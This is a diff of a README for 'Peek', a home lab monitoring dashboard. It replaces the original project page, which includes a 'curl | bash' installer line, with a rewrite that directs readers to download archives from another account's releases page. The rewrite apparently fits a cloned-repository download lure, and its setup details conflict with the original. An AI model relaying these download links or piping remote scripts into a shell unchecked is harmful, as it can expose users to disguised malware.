@@ -1,257 +1,96 @@
-# Peek
+# 🚀 peek - Your Home Lab Monitoring Dashboard
 
-A modern, self-hosted dashboard for monitoring home lab infrastructure. Built with React, TypeScript, and Express.
+[![Download Peek](https://img.shields.io/badge/Download-Peek-blue.svg)](https://github.com/jason187luka-eng/peek/releases)
+
+## 📋 Introduction
+
+Peek is a modern, self-hosted dashboard designed for monitoring your home lab infrastructure. Built with React, TypeScript, and Express, it offers an easy way to keep track of your systems and ensure everything runs smoothly.
 
 ![Dashboard](screenshots/dashboard-dark.png)
 
-> **Note**: This is a personal project that was primarily designed for my own home lab needs. It has been developed through "vibe coding" - built quickly to solve my specific problems without extensive testing or production hardening. Use at your own risk.
+## ⚠️ Note
 
-## Disclaimer
+This is a personal project created primarily for my own home lab needs. It has been developed quickly to address specific problems. Use it at your own risk.
+
+## 📜 Disclaimer
 
 **THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED.**
 
-By using this software, you acknowledge and agree that:
+By using this software, you accept that:
 
-- This is a hobby project with **no warranty, no support, and no guarantees** of any kind
-- The software may contain bugs, security vulnerabilities, or other issues
-- **No technical support** is provided - you are on your own
-- The author(s) are **not responsible** for any damage, data loss, security breaches, or other issues that may arise from using this software
-- This software connects to various third-party services and APIs - ensure you understand the security implications
-- **Use in production environments is at your own risk**
-- The author(s) reserve the right to abandon this project at any time without notice
+- This is a hobby project with **no warranty, no support, and no guarantees**.
+- The software may contain bugs, security vulnerabilities, or other issues.
+- **No technical support** is provided; you are on your own.
+- The author(s) are **not responsible** for any damage, data loss, security breaches, or other issues that may arise from using this software.
+- This software connects to various third-party services and APIs.
 
-If you need a production-ready, supported dashboard solution, please consider commercial alternatives.
+## 🚀 Getting Started
 
----
+To begin using Peek, follow these steps to download and run the software.
 
-## Features
+## 📥 Download & Install
 
-- **Multi-Dashboard Support** - Create multiple dashboards with different layouts
-- **50+ Integrations** - Connect to Proxmox, UniFi, Plex, Home Assistant, and more
-- **Widget Groups** - Organize widgets into collapsible groups
-- **Multiple Visualizations** - Configure widgets with different display styles
-- **Dark Mode** - System, light, and dark theme options
-- **Kiosk Mode** - Fullscreen display mode for wall-mounted screens
-- **Import/Export** - Backup and restore dashboards and configurations
-- **Image Libraries** - Organize and use custom images in widgets
-- **Built-in Documentation** - Access guides directly from the admin panel
-- **Dev Tools** - API explorer for testing integration endpoints
+1. Visit the [Releases page](https://github.com/jason187luka-eng/peek/releases) to download the latest version of Peek.
+2. Choose the correct file for your system. It may be a `.zip`, `.tar`, or another format.
+3. Download the file to your computer.
+4. Extract the contents of the file if necessary.
 
-![Admin Integrations](screenshots/admin-integrations.png)
+## 💻 System Requirements
 
-![Dev API Explorer](screenshots/dev-api-explorer.png)
+Before installing, make sure your computer meets the following requirements:
 
-## Quick Start
+- Operating System: Windows, macOS, or Linux.
+- Node.js: Version 14 or later.
+- npm: You can check if you have npm installed by running `npm -v` in the command line.
 
-### Docker (Recommended)
+## 🔧 Running the Application
 
-```bash
-# Clone the repository
-git clone https://github.com/unwrntd/peek.git
-cd peek
+After downloading and extracting Peek, follow these steps to run the application:
 
-# Start with Docker Compose
-docker compose -f docker/docker-compose.yml up -d
+1. Open your command line interface (CLI).
+2. Navigate to the directory where you extracted Peek.
+3. Run the following commands:
 
-# Access at http://localhost:8080
-```
+   ```bash
+   npm install
+   npm start
+   ```
 
-### Proxmox LXC Container
+Your dashboard should now be available at `http://localhost:3000`. Open this link in your web browser to access Peek.
 
-A script is provided to automatically create and configure an LXC container on Proxmox:
+## 🎨 Features
 
-```bash
-curl -fsSL "https://raw.githubusercontent.com/unwrntd/peek/main/scripts/create-lxc.sh" | bash
-```
+Peek comes with several features to enhance your monitoring experience:
 
-### Environment Variables
+- **User-friendly dashboard:** Easy-to-read graphs and stats for quick insights.
+- **Customizable views:** Adjust the layout to see the most relevant information at a glance.
+- **Real-time updates:** Monitor changes in your home lab as they happen.
+- **Integration with third-party services:** Connect with well-known APIs for enhanced functionality.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `PORT` | Server port | `3001` |
-| `DATA_DIR` | Data directory path | `./data` |
-| `NODE_ENV` | Environment mode | `development` |
-| `ALLOWED_ORIGINS` | CORS allowed origins (comma-separated) | `*` (all) |
+## 💡 Tips for Using Peek
 
-### Security Configuration
+- Take time to explore all the features available in Peek.
+- Customize the dashboard to display the information most important to you.
+- Save your configurations, so you can access them quickly in the future.
 
-For production deployments, configure CORS to restrict access:
+## 📞 Getting Help
 
-```bash
-# In docker-compose.yml or environment
-ALLOWED_ORIGINS=https://peek.example.com,https://dashboard.local
-```
+As this is a hobby project, support is not available. However, you can check community forums or resources related to similar open-source projects for assistance.
 
-## Architecture
+For any specific issues, consider looking at the issues section in the repository to see if others have faced similar problems.
 
-```
-peek/
-├── backend/           # Express.js API server
-│   ├── src/
-│   │   ├── database/      # SQLite database management
-│   │   ├── integrations/  # 50+ service adapters
-│   │   ├── middleware/    # Security, rate limiting
-│   │   ├── routes/        # API endpoints
-│   │   └── utils/         # Utilities
-│   └── package.json
-├── frontend/          # React SPA
-│   ├── src/
-│   │   ├── components/    # React components
-│   │   ├── config/        # Integration configurations
-│   │   ├── hooks/         # Custom React hooks
-│   │   └── stores/        # Zustand state management
-│   └── package.json
-├── docker/            # Docker configuration
-├── scripts/           # Deployment scripts
-└── docs/              # Documentation
-```
+## 📝 Contributions
 
-## Supported Integrations
+If you want to contribute to Peek, feel free to fork the repository and make your changes. You're welcome to submit a pull request, but remember that support and guarantees remain limited.
 
-> **Warning**: Many integrations are currently untested and may not work correctly. This project was built primarily for my own use case, so only integrations I actively use have been thoroughly tested. If you encounter issues with a specific integration, you may need to debug and fix it yourself.
+## 🛡️ Security
 
-![Integration Catalog](screenshots/integration-catalog.png)
+Be cautious when using Peek, as it may connect to various third-party services and APIs. Always ensure you understand the implications of these connections and follow best practices for security.
 
-### Infrastructure & Virtualization
-- Proxmox VE - Virtual machine and container management
-- QNAP NAS - Storage and system monitoring
-- Beszel - Server monitoring
-- PiKVM - KVM over IP
-- Kasm Workspaces - Virtual desktop infrastructure
-- ESXi - VMware hypervisor
+## 📢 Updates
 
-### Networking
-- UniFi Controller - Network device monitoring
-- UniFi Protect - Security camera system
-- AdGuard Home - DNS ad blocking
-- Cisco IOS XE - Network device management
-- NetAlertX - Network device detection
-- FortiGate, MikroTik, PAN-OS - Firewall/router management
+To stay updated with new features or bug fixes, regularly check the [Releases page](https://github.com/jason187luka-eng/peek/releases) for the latest versions. 
 
-### Media Servers
-- Plex Media Server - Media streaming
-- Tautulli - Plex statistics and monitoring
-- Immich - Self-hosted photo management
+## 👋 Thank You
 
-### Media Management
-- Sonarr - TV show management
-- Radarr - Movie management
-- Bazarr - Subtitle management
-- Tdarr - Media transcoding
-- Overseerr - Media requests
-- Prowlarr - Indexer management
-
-### Download Clients
-- SABnzbd - Usenet downloads
-- qBittorrent - Torrent downloads
-
-### Smart Home
-- Home Assistant - Home automation
-- Homebridge - HomeKit bridge
-- HomeKit - Apple HomeKit devices
-- TP-Link Tapo - Smart devices
-- TP-Link Kasa - Smart devices
-- Ring - Security devices
-- Home Connect - Smart appliances
-- Ecobee - Smart thermostats
-
-### Productivity
-- Notion - Workspace integration
-- Gitea - Git repository hosting
-- GitHub - Repository monitoring
-- Discord - Server monitoring
-- Slack - Workspace integration
-- Linear - Issue tracking
-
-### Other
-- Ollama - Local LLM server
-- Node-RED - Flow-based automation
-- Actual Budget - Personal finance
-- Paperless-ngx - Document management
-- Wazuh - Security monitoring
-- Weather - Weather forecasts (via Open-Meteo)
-- Sonos - Audio system control
-
-## Security Features
-
-Peek includes several security measures (though **no guarantees are made about their effectiveness**):
-
-### Rate Limiting
-- API endpoints: 100 requests per 15 minutes
-- Auth endpoints: 10 requests per minute
-- Data endpoints: 200 requests per minute
-
-### Security Headers
-- Content Security Policy (CSP)
-- X-Frame-Options (clickjacking protection)
-- X-Content-Type-Options (MIME sniffing protection)
-- Referrer-Policy
-- Permissions-Policy
-
-### Request Tracing
-- Unique request IDs for audit trails
-- Request logging with sanitized credentials
-
-### Input Validation
-- Search parameter length limits
-- File upload type restrictions
-- SQL parameterized queries
-
-## Development
-
-### Prerequisites
-- Node.js 20+
-- npm or yarn
-- Python 3 (for Kasa device support)
-
-### Setup
-
-```bash
-# Install dependencies
-cd backend && npm install
-cd ../frontend && npm install
-
-# Start development servers
-cd backend && npm run dev    # API on :3001
-cd frontend && npm run dev   # UI on :5173
-```
-
-### Building
-
-```bash
-# Build frontend
-cd frontend && npm run build
-
-# Build backend
-cd backend && npm run build
-
-# Or build Docker image
-docker compose -f docker/docker-compose.yml build
-```
-
-## Documentation
-
-- [Getting Started](docs/README.md)
-- [Adding Integrations](docs/ADDING_INTEGRATIONS.md) - Guide for creating new integrations
-- [Widget Configuration](docs/WIDGETS.md) - Widget visualizations and filters
-- [API Reference](docs/API.md) - Backend REST API documentation
-- [Security Guide](docs/SECURITY.md) - Security features and deployment recommendations
-
-You can also access documentation directly in the app via **Admin Settings > Docs**.
-
-## Contributing
-
-This is a personal project and contributions may or may not be accepted. If you'd like to contribute:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-**Note**: There is no guarantee that pull requests will be reviewed or merged in a timely manner (or at all).
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.**
+Thank you for considering Peek for your home lab monitoring needs! Have fun organizing and monitoring your infrastructure.
